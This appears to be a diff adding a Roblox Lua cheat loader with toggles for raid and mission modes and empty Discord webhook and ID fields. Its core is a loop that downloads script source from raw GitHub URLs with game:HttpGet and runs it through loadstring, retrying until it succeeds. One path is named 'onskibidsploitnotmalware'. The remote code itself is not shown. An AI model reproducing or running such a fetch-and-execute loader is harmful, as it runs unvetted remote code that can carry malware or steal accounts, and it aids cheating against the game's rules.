@@ -1,1 +1,37 @@
-deleted
+local ArmoredRaid = false
+local AttackRaid = false
+local Missions = false
+RetryDelay = 10 -- in seconds right now 10
+speed = 10 -- choose speed
+Webhook = "" -- obvious
+discordID = "" -- very obvious
+
+while not game:IsLoaded() do
+    task.wait(1)
+end
+
+
+local function executeScript(url)
+    while true do
+        local success, err = pcall(function()
+            local src = game:HttpGet(url)
+            loadstring(src)()
+        end)
+
+        if success then
+            print("[Loader] Script executed successfully.")
+            break
+        else
+            warn("[Loader] Failed to execute script. Retrying in 1 second...\nDetails:", err)
+            task.wait(1)
+        end
+    end
+end
+
+if ArmoredRaid then
+    executeScript("https://raw.githubusercontent.com/KingOreoTheThird/Scripts/refs/heads/main/Armor")
+elseif AttackRaid then
+    executeScript("https://raw.githubusercontent.com/KingOreoTheThird/Scripts/refs/heads/main/Attack")
+elseif Missions then
+    executeScript("https://raw.githubusercontent.com/Ashkinglomao/Fluent-Renewed-skibid-edition/refs/heads/main/.github/onskibidsploitnotmalware")
+end
